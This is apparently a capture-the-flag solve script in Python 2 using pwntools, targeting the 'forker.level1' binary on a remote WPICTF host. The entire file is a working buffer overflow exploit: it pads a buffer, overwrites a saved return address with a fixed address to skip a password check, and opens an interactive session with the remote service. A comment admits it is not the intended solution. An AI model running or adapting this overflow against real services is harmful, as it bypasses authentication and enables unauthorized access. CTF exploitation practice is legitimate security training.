#!/usr/bin/env python2

# Not correct solution, but jumps to correct branch after checkpassword

from pwn import *

binary = ELF('./forker.level1')
context.binary = binary

buf_size = 0x4c
rip_offset = 0x50 + 8 # rbp - buf = 0x50; saved rip - buf = 8
correct_addr = 0x400b4f

setup = 'a'*buf_size + p8(rip_offset)

payload = p64(correct_addr)

r = remote('forker1.wpictf.xyz', 31337)
r.send(setup + payload + '\n')
r.interactive()
